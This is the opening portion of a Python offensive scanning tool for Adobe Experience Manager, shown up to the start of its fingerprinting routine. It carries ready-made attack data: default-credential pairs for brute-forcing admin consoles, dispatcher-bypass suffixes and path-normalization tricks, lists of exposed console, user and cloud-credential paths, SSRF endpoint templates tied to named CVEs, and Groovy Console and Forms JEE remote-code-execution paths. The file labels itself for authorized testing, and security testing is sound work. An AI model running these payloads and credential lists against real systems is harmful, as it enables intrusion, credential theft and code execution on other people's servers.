#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
aem_hunter.py - Adobe Experience Manager Security Audit Tool
=============================================================

A single-file scanner for authorized AEM penetration testing and bug bounty
workflows. Drop the script onto a box, run it, and get a console + HTML +
JSON report of misconfigurations, exposed admin surfaces, dispatcher
bypasses, and selected high-impact CVEs.

Covers:
  - Fingerprinting (Author vs Publish, version hints, Sling/Day/CQ headers)
  - Default credentials (basic auth probe of admin surfaces)
  - Exposed admin consoles (Felix /system/console, CRX DE / Package Manager /
    Explorer, Groovy Console, WebDAV, Apache Sling Web Console)
  - QueryBuilder API exposure + selector / extension bypasses
  - Dispatcher bypass fuzzing (.css / .js / .png / .html selector tricks,
    `;` semicolon abuse, `..;/` Jetty normalization, %2f / %00 / %0a quirks)
  - Sling info disclosure (.json, .1.json, .tidy.json, .infinity.json,
    .harray.4.json on /content, /etc, /apps, /var, /home, /libs, /tmp)
  - JCR enumeration (users.1.json, groups.1.json, currentuser.json,
    authorizables, group memberships)
  - Cloud services / connector credential leakage (/etc/cloudservices.*)
  - SSRF endpoints (linkchecker, SalesforceSecretServlet [CVE-2018-5006],
    ReportingServicesServlet [CVE-2018-12809], external resource fetchers)
  - 2025 CVE wave (CVE-2025-54253 OGNL RCE in Forms JEE, CVE-2025-54254 XXE,
    CVE-2025-49533)
  - CVE-2021-43762 path-traversal / feature bypass
  - Sling POST servlet abuse (node creation, property manipulation,
    `:operation`/`:member` primitives)
  - Replication agent transport credential disclosure
  - Source / clientlib disclosure tricks
  - Authenticated, role-based probing (Content Editor, CPB Deployer, etc.)
  - Three-channel reporting: live console, JSON, HTML

Author: pentest use only.  Authorization required.
"""
from __future__ import annotations

import argparse
import base64
import concurrent.futures as cf
import datetime as dt
import getpass
import html as html_mod
import json
import os
import random
import re
import socket
import string
import sys
import textwrap
import threading
import time
import urllib.parse as up
from dataclasses import dataclass, field, asdict
from typing import Any, Callable, Dict, Iterable, List, Optional, Set, Tuple, Union

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:  # pragma: no cover
    sys.stderr.write("[!] Missing dependency 'requests'.\n")
    sys.stderr.write("    Install with: pip install requests urllib3\n")
    sys.exit(1)


VERSION = "1.0.0"

# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------
BANNER = r"""
    _    _____ __  __   _   _ _   _ _   _ _____ _____ ____
   / \  | ____|  \/  | | | | | | | | \ | |_   _| ____|  _ \
  / _ \ |  _| | |\/| | | |_| | | | |  \| | | | |  _| | |_) |
 / ___ \| |___| |  | | |  _  | |_| | |\  | | | | |___|  _ <
/_/   \_\_____|_|  |_| |_| |_|\___/|_| \_| |_| |_____|_| \_\

       Adobe Experience Manager  -  Offensive Audit Toolkit  v{ver}
       Authorized testing only. Don't be a jerk.
"""

# ---------------------------------------------------------------------------
# Severity & metadata constants
# ---------------------------------------------------------------------------
SEV_INFO = "INFO"
SEV_LOW = "LOW"
SEV_MEDIUM = "MEDIUM"
SEV_HIGH = "HIGH"
SEV_CRITICAL = "CRITICAL"

SEV_ORDER = {SEV_CRITICAL: 5, SEV_HIGH: 4, SEV_MEDIUM: 3, SEV_LOW: 2, SEV_INFO: 1}

CAT_FINGERPRINT = "Fingerprinting"
CAT_AUTH = "Authentication"
CAT_EXPOSURE = "Exposed Endpoint"
CAT_DISPATCHER = "Dispatcher Bypass"
CAT_DISCLOSURE = "Information Disclosure"
CAT_SSRF = "SSRF"
CAT_RCE = "Remote Code Execution"
CAT_XXE = "XXE"
CAT_XSS = "XSS"
CAT_JCR = "JCR / Sling"
CAT_CVE = "Known CVE"
CAT_MISCONFIG = "Misconfiguration"
CAT_ROLE = "Authenticated Role"

# ---------------------------------------------------------------------------
# Default credentials — well-known AEM accounts (admin surfaces only).
# Order matters: highest-value targets first.
# ---------------------------------------------------------------------------
DEFAULT_CREDENTIALS: List[Tuple[str, str]] = [
    ("admin", "admin"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("admin", ""),
    ("author", "author"),
    ("anonymous", "anonymous"),
    ("replication-receiver", "replication-receiver"),
    ("vgnadmin", "vgnadmin"),
    ("administrator", "administrator"),
    ("audit", "audit"),
    ("grios", "password"),
    # Geometrixx sample-content users (AEM 5.x / 6.0 / 6.1 demo)
    ("aparker@geometrixx.info", "aparker"),
    ("jdoe@geometrixx.info", "jdoe"),
    ("james.devore@spambob.com", "password"),
    ("matt.monroe@mailinator.com", "password"),
    ("aaron.mcdonald@mailinator.com", "password"),
    ("jason.werner@dodgit.com", "password"),
    # AEM Sites / DAM / Forms internal accounts that ship empty by default
    ("dam-creators", "dam-creators"),
    ("forms-manager", "forms-manager"),
    ("workflow-administrators", "workflow-administrators"),
]

# Surfaces that respond with HTTP 401 (WWW-Authenticate Basic) for an
# unauthenticated request and HTTP 200 once valid credentials are sent.
# Picking surfaces that don't allow anonymous so a 200 is a strong positive.
AUTH_PROBE_PATHS = [
    "/crx/de/index.jsp",
    "/system/console/bundles",
    "/crx/packmgr/index.jsp",
    "/libs/granite/core/content/login.html/j_security_check",
]

# ---------------------------------------------------------------------------
# Sensitive paths to probe unauthenticated.
# Each entry: (path, severity_if_exposed, category, label, signature_regex|None)
# A signature_regex of None means 200 OK is sufficient.
# ---------------------------------------------------------------------------
SENSITIVE_ENDPOINTS: List[Tuple[str, str, str, str, Optional[str]]] = [
    # Admin consoles
    ("/system/console",                            SEV_CRITICAL, CAT_EXPOSURE,  "Apache Felix OSGi Web Console exposed",        r"(Apache Felix Web Console|OSGi Management Console)"),
    ("/system/console/bundles",                    SEV_CRITICAL, CAT_EXPOSURE,  "Felix OSGi bundles console exposed",            r"(Bundles|Apache Felix)"),
    ("/system/console/configMgr",                  SEV_CRITICAL, CAT_EXPOSURE,  "Felix OSGi ConfigMgr console exposed",          r"(Configuration|Apache Felix)"),
    ("/system/console/components",                 SEV_HIGH,     CAT_EXPOSURE,  "Felix OSGi components console exposed",         r"(Component|Apache Felix)"),
    ("/system/console/status-slingsettings",       SEV_HIGH,     CAT_DISCLOSURE,"Sling Settings status page exposed",            r"(Sling Settings|sling\.id|sling\.run\.modes)"),
    ("/system/console/jmx",                        SEV_HIGH,     CAT_EXPOSURE,  "Felix JMX bridge exposed",                       r"(JMX|MBean)"),
    ("/system/console/profiler",                   SEV_HIGH,     CAT_EXPOSURE,  "Sling Profiler exposed",                         r"(Profiler|sling)"),
    ("/system/console/depfinder",                  SEV_MEDIUM,   CAT_DISCLOSURE,"Felix Dependency Finder exposed",                r"(Dependency Finder|Apache Felix)"),
    ("/system/console/healthcheck",                SEV_MEDIUM,   CAT_DISCLOSURE,"Sling Healthcheck console exposed",              r"(Health[Cc]heck)"),
    # CRX
    ("/crx/de/index.jsp",                          SEV_CRITICAL, CAT_EXPOSURE,  "CRXDE Lite IDE exposed (full JCR write)",       r"(CRXDE|Adobe Granite)"),
    ("/crx/de/",                                   SEV_CRITICAL, CAT_EXPOSURE,  "CRXDE Lite exposed",                             r"(CRXDE|Granite)"),
    ("/crx/packmgr/index.jsp",                     SEV_CRITICAL, CAT_EXPOSURE,  "CRX Package Manager exposed",                    r"(Package Manager|CRX)"),
    ("/crx/packmgr/service.jsp",                   SEV_CRITICAL, CAT_EXPOSURE,  "CRX Package Manager service endpoint exposed",   None),
    ("/crx/packmgr/service/.json",                 SEV_HIGH,     CAT_EXPOSURE,  "CRX Package Manager JSON service exposed",       None),
    ("/crx/packmgr/list.jsp",                      SEV_HIGH,     CAT_EXPOSURE,  "CRX Package list endpoint exposed",              None),
    ("/crx/explorer/index.jsp",                    SEV_HIGH,     CAT_EXPOSURE,  "CRX Explorer exposed",                           r"(Content Explorer|CRX)"),
    ("/crx/explorer/browser/index.jsp",            SEV_HIGH,     CAT_EXPOSURE,  "CRX Browser exposed",                            r"(CRX|Browser)"),
    ("/crx/explorer/diagnostic/diagnostic.jsp",    SEV_MEDIUM,   CAT_DISCLOSURE,"CRX diagnostic page exposed",                    None),
    ("/crx/repository/crx.default",                SEV_HIGH,     CAT_EXPOSURE,  "CRX WebDAV root exposed",                        r"(WebDAV|MKCOL|PROPFIND)"),
    ("/crx/server/crx.default/jcr%3aroot",         SEV_HIGH,     CAT_EXPOSURE,  "CRX JCR server root exposed",                    None),
    # Author UI / login fingerprints
    ("/libs/granite/core/content/login.html",      SEV_INFO,     CAT_FINGERPRINT,"AEM login page reachable",                       r"(QUICKSTART|Adobe Experience Manager|granite)"),
    ("/libs/cq/core/content/welcome.html",         SEV_INFO,     CAT_FINGERPRINT,"AEM welcome page reachable",                     r"(Welcome|AEM)"),
    ("/aem/start.html",                            SEV_INFO,     CAT_FINGERPRINT,"AEM start page reachable",                       r"(start|AEM|granite)"),
    # Groovy
    ("/bin/groovyconsole",                         SEV_CRITICAL, CAT_RCE,       "Groovy Console exposed (RCE)",                   r"(Groovy|Console)"),
    ("/bin/groovyconsole.html",                    SEV_CRITICAL, CAT_RCE,       "Groovy Console UI exposed (RCE)",                r"(Groovy|Console)"),
    ("/etc/groovyconsole.html",                    SEV_CRITICAL, CAT_RCE,       "Legacy Groovy Console (etc) exposed (RCE)",      r"(Groovy)"),
    # WCM / authoring
    ("/bin/wcmcommand",                            SEV_MEDIUM,   CAT_EXPOSURE,  "Sling WCM command endpoint exposed",             None),
    ("/bin/wcm/contentfinder/page/view.json",      SEV_MEDIUM,   CAT_DISCLOSURE,"Content Finder JSON exposed",                    None),
    ("/bin/receive",                               SEV_MEDIUM,   CAT_EXPOSURE,  "Sling receive endpoint exposed",                 None),
    # Reports / forms
    ("/etc/reports.html",                          SEV_LOW,      CAT_EXPOSURE,  "AEM Reports console exposed",                    None),
    ("/etc/workflow.html",                         SEV_LOW,      CAT_EXPOSURE,  "AEM Workflow console exposed",                   None),
    # Sling / Authorizables
    ("/libs/granite/security/userinfo.json",       SEV_LOW,      CAT_DISCLOSURE,"Current user info endpoint exposed",             r"\"userID\""),
    ("/libs/granite/security/currentuser.json",    SEV_LOW,      CAT_DISCLOSURE,"Current user endpoint exposed",                  r"\"home\""),
    ("/libs/cq/security/userinfo.json",            SEV_LOW,      CAT_DISCLOSURE,"Legacy user info endpoint exposed",              r"\"userID\""),
    ("/libs/cq/security/content/admin/groups.json",SEV_HIGH,     CAT_DISCLOSURE,"Group admin JSON exposed",                       r"(groups|administrators)"),
    ("/libs/cq/security/post/authorizables.json",  SEV_HIGH,     CAT_DISCLOSURE,"Authorizables endpoint exposed",                 r"(authorizable|users)"),
    # Replication / packages / etc
    ("/etc/replication.json",                      SEV_HIGH,     CAT_DISCLOSURE,"Replication agents config exposed",              r"(transportUri|replication)"),
    ("/etc/replication/agents.author.json",        SEV_HIGH,     CAT_DISCLOSURE,"Author replication agents exposed",              None),
    ("/etc/replication/agents.publish.json",       SEV_HIGH,     CAT_DISCLOSURE,"Publish replication agents exposed",             None),
    ("/etc/packages.json",                         SEV_MEDIUM,   CAT_DISCLOSURE,"Packages listing exposed",                       None),
    # Cloud services — high value: can leak AWS/Salesforce/Marketo keys
    ("/etc/cloudservices.json",                    SEV_HIGH,     CAT_DISCLOSURE,"Cloud services config exposed",                  None),
    ("/etc/cloudservices.infinity.json",           SEV_CRITICAL, CAT_DISCLOSURE,"Cloud services credentials may leak",            None),
    ("/etc/cloudsettings.json",                    SEV_MEDIUM,   CAT_DISCLOSURE,"Cloud settings exposed",                         None),
    ("/etc/key.json",                              SEV_HIGH,     CAT_DISCLOSURE,"Encryption key node exposed",                    None),
    # Linkchecker (SSRF primitive)
    ("/libs/wcm/resources/linkchecker.json",       SEV_MEDIUM,   CAT_SSRF,      "External Link Checker reachable",                None),
    ("/etc/linkchecker.html",                      SEV_LOW,      CAT_EXPOSURE,  "Link Checker config page exposed",               None),
    # Forms (JEE) — CVE 2025 surface
    ("/adminui/debug",                             SEV_CRITICAL, CAT_RCE,       "AEM Forms JEE debug console exposed (CVE-2025-54253)", None),
    ("/adminui",                                   SEV_HIGH,     CAT_EXPOSURE,  "AEM Forms JEE admin UI exposed",                 None),
    ("/lc/system/console",                         SEV_CRITICAL, CAT_EXPOSURE,  "LiveCycle admin console exposed",                None),
    ("/lc/libs/granite/core/content/login.html",   SEV_INFO,     CAT_FINGERPRINT,"LiveCycle login page reachable",                  None),
    # Dispatcher info / debug
    ("/dispatcher/invalidate.cache",               SEV_HIGH,     CAT_MISCONFIG, "Dispatcher invalidation endpoint reachable",     None),
    # GraphQL (newer AEM)
    ("/content/graphql/global/endpoint.json",      SEV_LOW,      CAT_EXPOSURE,  "AEM GraphQL endpoint reachable",                 None),
    ("/content/cq:graphql/global/endpoint.json",   SEV_LOW,      CAT_EXPOSURE,  "AEM GraphQL legacy endpoint reachable",          None),
    # Misc
    ("/etc/clientlibs.json",                       SEV_LOW,      CAT_DISCLOSURE,"clientlibs tree exposed",                        None),
    ("/etc/designs.json",                          SEV_LOW,      CAT_DISCLOSURE,"designs tree exposed",                           None),
    ("/var/audit.json",                            SEV_MEDIUM,   CAT_DISCLOSURE,"Audit log path exposed",                         None),
    ("/var.json",                                  SEV_LOW,      CAT_DISCLOSURE,"/var root JSON exposed",                         None),
    ("/tmp.json",                                  SEV_LOW,      CAT_DISCLOSURE,"/tmp root JSON exposed",                         None),
    ("/home.json",                                 SEV_LOW,      CAT_DISCLOSURE,"/home root JSON exposed",                        None),
    ("/home/users.1.json",                         SEV_HIGH,     CAT_DISCLOSURE,"User listing JSON exposed",                      r"(rep:User|jcr:primaryType)"),
    ("/home/groups.1.json",                        SEV_HIGH,     CAT_DISCLOSURE,"Group listing JSON exposed",                     r"(rep:Group|jcr:primaryType)"),
    ("/etc.1.json",                                SEV_MEDIUM,   CAT_DISCLOSURE,"/etc JSON exposed",                              None),
    ("/apps.1.json",                               SEV_MEDIUM,   CAT_DISCLOSURE,"/apps JSON exposed",                             None),
    ("/libs.json",                                 SEV_LOW,      CAT_DISCLOSURE,"/libs root JSON exposed",                        None),
]

# ---------------------------------------------------------------------------
# Sling selector / extension permutations used as dispatcher bypass payloads.
# The idea: Dispatcher checks the URI string against a regex allow-list. If
# the suffix looks like an allowed static asset (.css, .js, .png, etc.) it is
# forwarded to the backend. Sling normalizes selectors and extensions during
# resource resolution and ignores the trailing ".css" — so the JSON / debug
# servlet ends up serving its real response.
# ---------------------------------------------------------------------------
BYPASS_EXTENSIONS = [".css", ".js", ".ico", ".png", ".gif", ".jpg", ".svg", ".html", ".woff", ".woff2"]
BYPASS_SUFFIXES: List[str] = []
for ext in BYPASS_EXTENSIONS:
    BYPASS_SUFFIXES.append(ext)
    BYPASS_SUFFIXES.append("/a" + ext)
    BYPASS_SUFFIXES.append(";%0a" + ext)
    BYPASS_SUFFIXES.append("/" + ext)
    BYPASS_SUFFIXES.append(";." + ext.strip("."))
    BYPASS_SUFFIXES.append("/." + ext.strip("."))
    BYPASS_SUFFIXES.append("/x" + ext + "/x.json")
# Path-fragment normalization tricks
PATH_BYPASS_PREFIXES = [
    "",
    "/",
    "//",
    "/./",
    "/.;/",
    "/..;/",
    "/%2e%2e/",
    "/%2f",
]

# Targets to fuzz with dispatcher bypass suffixes.
# We pick endpoints whose unauthenticated baseline is normally 403/404 and
# whose breach is high impact.
DISPATCHER_TARGETS: List[Tuple[str, str, str]] = [
    ("/bin/querybuilder.json?path=/&p.hits=full&p.limit=1", "QueryBuilder API",       SEV_HIGH),
    ("/bin/querybuilder.json?path=/etc&p.hits=full&p.limit=1", "QueryBuilder API (etc)", SEV_HIGH),
    ("/bin/querybuilder.json?path=/home/users&p.hits=full&p.limit=1", "QueryBuilder API (users)", SEV_HIGH),
    ("/bin/querybuilder.feed.xml?path=/&p.hits=full&p.limit=1", "QueryBuilder feed",   SEV_HIGH),
    ("/bin/querybuilder.json.servlet", "QueryBuilder servlet path",                    SEV_HIGH),
    ("/system/console", "Felix OSGi console",                                          SEV_CRITICAL),
    ("/system/console/bundles", "Felix bundles console",                               SEV_CRITICAL),
    ("/system/console/configMgr", "Felix ConfigMgr",                                   SEV_CRITICAL),
    ("/system/console/status-slingsettings", "Sling Settings",                         SEV_HIGH),
    ("/crx/de/index.jsp", "CRXDE Lite",                                                SEV_CRITICAL),
    ("/crx/packmgr/index.jsp", "CRX Package Manager",                                  SEV_CRITICAL),
    ("/crx/packmgr/service/.json", "CRX Package Manager service",                      SEV_HIGH),
    ("/bin/groovyconsole", "Groovy Console",                                           SEV_CRITICAL),
    ("/etc/replication.json", "Replication agents",                                    SEV_HIGH),
    ("/etc/packages.json", "Packages listing",                                         SEV_MEDIUM),
    ("/etc/cloudservices.infinity.json", "Cloud services tree",                        SEV_CRITICAL),
    ("/home/users.1.json", "Users listing",                                            SEV_HIGH),
    ("/home/groups.1.json", "Groups listing",                                          SEV_HIGH),
    ("/libs/granite/security/userinfo.json", "User info",                              SEV_LOW),
    ("/libs/cq/security/content/admin/groups.json", "Group admin JSON",                SEV_HIGH),
    ("/adminui/debug", "AEM Forms JEE OGNL debug (CVE-2025-54253)",                    SEV_CRITICAL),
]

# Roots fuzzed with Sling info-disclosure selectors (.json, .1.json, .infinity.json, ...)
SLING_INFO_ROOTS = [
    "/content", "/etc", "/apps", "/libs", "/var", "/home", "/tmp",
    "/content/dam", "/content/projects", "/content/we-retail", "/content/geometrixx",
    "/etc/cloudservices", "/etc/replication", "/etc/key", "/etc/packages",
    "/home/users", "/home/groups",
]
SLING_INFO_SELECTORS = [
    ".json", ".1.json", ".2.json", ".4.json", ".tidy.json", ".infinity.json",
    ".tidy.infinity.json", ".tidy.-1.json", ".harray.4.json", ".tidy.harray.4.json",
    ".children.json", ".feed.xml", ".xml",
]

# Endpoints we attempt SSRF against. Each entry is (template, param, label, CVE).
SSRF_TARGETS: List[Tuple[str, str, str, Optional[str]]] = [
    ("/libs/wcm/resources/linkchecker.json?path={u}",                      "path",         "linkchecker", None),
    ("/libs/wcm/resources/linkchecker.json?url={u}",                       "url",          "linkchecker (url param)", None),
    ("/etc/linkchecker.html?url={u}",                                      "url",          "linkchecker HTML", None),
    ("/libs/mcm/salesforce/customer.json?checkType=authentication&instance_url={u}", "instance_url", "SalesforceSecretServlet SSRF (CVE-2018-5006)", "CVE-2018-5006"),
    ("/libs/dam/cloud/proxy.json?host={u}",                                "host",         "DAM cloud proxy", None),
    ("/libs/opensocial/proxy?url={u}",                                     "url",          "OpenSocial proxy", None),
    ("/etc/reports/userreport.html?path={u}",                              "path",         "ReportingServicesServlet (CVE-2018-12809)", "CVE-2018-12809"),
    ("/bin/reports.json?path={u}",                                         "path",         "Reports JSON", None),
    ("/libs/granite/core/content/forms/components/oauth/google.json?key={u}", "key",       "Google OAuth fetcher", None),
]

# Useful regex-derived AEM signatures
RE_AEM_HEADERS = re.compile(r"(?i)(serv(er|let-engine).*sling|day-)|cq[-_]|adobe[-_]experience[-_]manager")
RE_AEM_BODY = re.compile(r"(?i)(granite|Adobe Experience Manager|Sling|/etc/clientlibs/|CQ\.WCM|cq\.shared|CRXDE)")
RE_AUTHOR_HINT = re.compile(r"(?i)(touch-ui|cq\.authoring|authoringUI|x-author)")
RE_PUBLISH_HINT = re.compile(r"(?i)(publish-only|x-publish|dispatcher)")

# ---------------------------------------------------------------------------
# Logger
# ---------------------------------------------------------------------------
class Logger:
    COLORS = {
        "RESET": "\033[0m", "BOLD": "\033[1m", "DIM": "\033[2m",
        "RED": "\033[31m", "GREEN": "\033[32m", "YELLOW": "\033[33m",
        "BLUE": "\033[34m", "MAGENTA": "\033[35m", "CYAN": "\033[36m",
        "WHITE": "\033[37m", "BRIGHT_RED": "\033[91m",
        "BRIGHT_GREEN": "\033[92m", "BRIGHT_YELLOW": "\033[93m",
        "BRIGHT_CYAN": "\033[96m",
    }
    SEV_COLORS = {
        SEV_CRITICAL: "BRIGHT_RED",
        SEV_HIGH: "RED",
        SEV_MEDIUM: "YELLOW",
        SEV_LOW: "BLUE",
        SEV_INFO: "DIM",
    }

    def __init__(self, verbose: bool = False, no_color: bool = False):
        self.verbose = verbose
        self.no_color = no_color or not sys.stdout.isatty()
        self._lock = threading.Lock()

    def _c(self, name: str) -> str:
        if self.no_color:
            return ""
        return self.COLORS.get(name, "")

    def section(self, msg: str) -> None:
        with self._lock:
            bar = "=" * max(50, len(msg) + 4)
            print(f"\n{self._c('BOLD')}{self._c('BRIGHT_CYAN')}{bar}{self._c('RESET')}")
            print(f"{self._c('BOLD')}{self._c('BRIGHT_CYAN')}  {msg}{self._c('RESET')}")
            print(f"{self._c('BOLD')}{self._c('BRIGHT_CYAN')}{bar}{self._c('RESET')}")

    def info(self, msg: str) -> None:
        with self._lock:
            print(f"{self._c('CYAN')}[*]{self._c('RESET')} {msg}")

    def good(self, msg: str) -> None:
        with self._lock:
            print(f"{self._c('GREEN')}[+]{self._c('RESET')} {msg}")

    def warn(self, msg: str) -> None:
        with self._lock:
            print(f"{self._c('YELLOW')}[!]{self._c('RESET')} {msg}")

    def err(self, msg: str) -> None:
        with self._lock:
            print(f"{self._c('RED')}[x]{self._c('RESET')} {msg}", file=sys.stderr)

    def debug(self, msg: str) -> None:
        if self.verbose:
            with self._lock:
                print(f"{self._c('DIM')}[.] {msg}{self._c('RESET')}")

    def finding(self, sev: str, title: str) -> None:
        color = self._c(self.SEV_COLORS.get(sev, "WHITE"))
        with self._lock:
            print(f"{color}[{sev:<8}]{self._c('RESET')} {title}")


# ---------------------------------------------------------------------------
# Findings + Reporter
# ---------------------------------------------------------------------------
@dataclass
class Finding:
    title: str
    severity: str
    category: str
    target: str
    evidence: str = ""
    cve: Optional[str] = None
    description: str = ""
    references: List[str] = field(default_factory=list)
    request: str = ""
    response_snippet: str = ""
    role: Optional[str] = None
    timestamp: str = field(default_factory=lambda: dt.datetime.now().isoformat(timespec="seconds"))


class Reporter:
    def __init__(self, logger: Logger):
        self.findings: List[Finding] = []
        self._lock = threading.Lock()
        self.logger = logger
        self._seen_keys: Set[str] = set()

    def add(self, finding: Finding) -> bool:
        key = f"{finding.severity}|{finding.category}|{finding.title}|{finding.target}|{finding.role or ''}"
        with self._lock:
            if key in self._seen_keys:
                return False
            self._seen_keys.add(key)
            self.findings.append(finding)
            self.logger.finding(finding.severity, f"{finding.title} :: {finding.target}")
            return True

    def by_severity(self) -> List[Finding]:
        return sorted(self.findings, key=lambda f: (-SEV_ORDER.get(f.severity, 0), f.category, f.title))

    def summary(self) -> Dict[str, int]:
        out = {SEV_CRITICAL: 0, SEV_HIGH: 0, SEV_MEDIUM: 0, SEV_LOW: 0, SEV_INFO: 0}
        for f in self.findings:
            out[f.severity] = out.get(f.severity, 0) + 1
        return out


# ---------------------------------------------------------------------------
# HTTP client wrapper
# ---------------------------------------------------------------------------
class HttpClient:
    DEFAULT_UA = "Mozilla/5.0 (X11; Linux x86_64) AEM-Hunter/" + VERSION

    def __init__(
        self,
        base_url: str,
        timeout: int = 15,
        proxy: Optional[str] = None,
        threads: int = 10,
        verify: bool = False,
        user_agent: Optional[str] = None,
        cookies: Optional[Dict[str, str]] = None,
        basic_auth: Optional[Tuple[str, str]] = None,
        custom_headers: Optional[Dict[str, str]] = None,
        rate_limit: float = 0.0,
        logger: Optional[Logger] = None,
    ):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.threads = threads
        self.verify = verify
        self.rate_limit = rate_limit
        self.logger = logger
        self._last_request_ts = 0.0
        self._rl_lock = threading.Lock()

        self.session = requests.Session()
        adapter = HTTPAdapter(
            pool_connections=max(threads * 2, 10),
            pool_maxsize=max(threads * 2, 10),
            max_retries=Retry(total=2, backoff_factor=0.3, status_forcelist=[502, 503, 504]),
        )
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

        self.session.headers.update({
            "User-Agent": user_agent or self.DEFAULT_UA,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.8",
        })
        if custom_headers:
            self.session.headers.update(custom_headers)
        if cookies:
            for k, v in cookies.items():
                self.session.cookies.set(k, v)
        if basic_auth:
            self.session.auth = basic_auth
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def url(self, path: str) -> str:
        if path.startswith("http://") or path.startswith("https://"):
            return path
        if not path.startswith("/"):
            path = "/" + path
        return self.base_url + path

    def _ratelimit(self) -> None:
        if self.rate_limit <= 0:
            return
        with self._rl_lock:
            now = time.time()
            wait = self._last_request_ts + (1.0 / self.rate_limit) - now
            if wait > 0:
                time.sleep(wait)
            self._last_request_ts = time.time()

    def request(self, method: str, path: str, **kwargs) -> Optional[requests.Response]:
        self._ratelimit()
        url = self.url(path)
        kwargs.setdefault("timeout", self.timeout)
        kwargs.setdefault("verify", self.verify)
        kwargs.setdefault("allow_redirects", False)
        try:
            r = self.session.request(method, url, **kwargs)
            if self.logger:
                self.logger.debug(f"{method} {url} -> {r.status_code} ({len(r.content)} bytes)")
            return r
        except requests.exceptions.RequestException as e:
            if self.logger:
                self.logger.debug(f"{method} {url} -> ERR {e.__class__.__name__}: {e}")
            return None

    def get(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("GET", path, **kwargs)

    def post(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("POST", path, **kwargs)

    def put(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("PUT", path, **kwargs)

    def delete(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("DELETE", path, **kwargs)

    def head(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("HEAD", path, **kwargs)

    def options(self, path: str, **kwargs) -> Optional[requests.Response]:
        return self.request("OPTIONS", path, **kwargs)

    def request_signature(self, method: str, path: str, headers: Optional[Dict] = None,
                          body: Optional[str] = None) -> str:
        lines = [f"{method} {path} HTTP/1.1"]
        if "://" in path:
            host = up.urlparse(path).hostname
        else:
            host = up.urlparse(self.base_url).hostname
        if host:
            lines.append(f"Host: {host}")
        for k, v in (self.session.headers or {}).items():
            lines.append(f"{k}: {v}")
        if headers:
            for k, v in headers.items():
                lines.append(f"{k}: {v}")
        cookie_kv = "; ".join([f"{k}={v}" for k, v in self.session.cookies.get_dict().items()])
        if cookie_kv:
            lines.append(f"Cookie: {cookie_kv}")
        lines.append("")
        if body:
            lines.append(body[:2000])
        return "\n".join(lines)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def snippet(text: str, n: int = 500) -> str:
    if not text:
        return ""
    t = text.strip()
    if len(t) <= n:
        return t
    return t[:n] + "...[truncated]"


def safe_response_text(r: Optional[requests.Response], n: int = 500) -> str:
    if not r:
        return ""
    try:
        return snippet(r.text, n)
    except Exception:
        try:
            return snippet(r.content.decode("utf-8", "replace"), n)
        except Exception:
            return ""


def normalize_target(target: str) -> str:
    target = target.strip()
    if not target:
        return target
    if not target.startswith("http://") and not target.startswith("https://"):
        target = "https://" + target
    return target.rstrip("/")


def parse_cookie_string(s: str) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for kv in s.split(";"):
        kv = kv.strip()
        if not kv:
            continue
        if "=" in kv:
            k, v = kv.split("=", 1)
            out[k.strip()] = v.strip()
    return out


def parse_headers_string(s: str) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for line in s.splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue
        k, v = line.split(":", 1)
        out[k.strip()] = v.strip()
    return out


def parse_basic_auth(s: str) -> Optional[Tuple[str, str]]:
    if not s:
        return None
    if ":" not in s:
        return None
    u, p = s.split(":", 1)
    return (u, p)


def short_host(target: str) -> str:
    try:
        h = up.urlparse(target).hostname or "target"
        return re.sub(r"[^a-zA-Z0-9._-]", "_", h)
    except Exception:
        return "target"


# ---------------------------------------------------------------------------
# Main scanner
# ---------------------------------------------------------------------------
class AEMHunter:
    def __init__(self, target: str, logger: Logger, reporter: Reporter,
                 client: HttpClient, threads: int = 10, role: Optional[str] = None,
                 enable_modules: Optional[Set[str]] = None,
                 fuzz_aggression: str = "normal"):
        self.target = target
        self.logger = logger
        self.reporter = reporter
        self.client = client
        self.threads = threads
        self.role = role
        self.enable_modules = enable_modules  # None means all
        self.fuzz_aggression = fuzz_aggression  # quick / normal / aggressive
        self._fingerprint: Dict[str, Any] = {}
        self._csrf_token: Optional[str] = None

    # ---- module gating helper ----
    def _enabled(self, name: str) -> bool:
        if self.enable_modules is None:
            return True
        return name in self.enable_modules

    # =======================================================================
    # 1. Fingerprinting
    # =======================================================================
    def fingerprint(self) -> Dict[str, Any]:
        self.logger.section("Fingerprinting")
        fp: Dict[str, Any] = {"is_aem": False, "instance": "unknown",
                              "version": None, "headers": {}, "indicators": []}

        # Root / login / welcome probes
        probe_paths = [
            "/", "/libs/granite/core/content/login.html",
            "/libs/cq/core/content/welcome.html",
            "/etc/clientlibs/granite/utils.js",
            "/system/sling.js",
            "/libs/granite/security/currentuser.json",
        ]
        for p in probe_paths:
            r = self.client.get(p)
            if not r:
                continue
            for h, v in r.headers.items():
                if RE_AEM_HEADERS.search(f"{h}: {v}"):
                    fp["is_aem"] = True
                    fp["headers"][h] = v
                    fp["indicators"].append(f"header {h}: {v}")
            body = safe_response_text(r, 4000)
            if RE_AEM_BODY.search(body):
                fp["is_aem"] = True
                fp["indicators"].append(f"body marker on {p}")
            if RE_AUTHOR_HINT.search(body):
                fp["instance"] = "author"
            elif RE_PUBLISH_HINT.search(body):
                fp["instance"] = "publish"
            m = re.search(r"AEM[^\d]*(6\.\d|2021\.\d+|2022\.\d+|2023\.\d+|2024\.\d+|2025\.\d+|2026\.\d+)", body)
            if m:
                fp["version"] = m.group(0)

        # Granite QuickStart fingerprint
        r = self.client.get("/")
        if r is not None:
            srv = r.headers.get("Server", "")
            if "Jetty" in srv or "Day-Servlet" in srv or "Communique" in srv:
                fp["is_aem"] = True
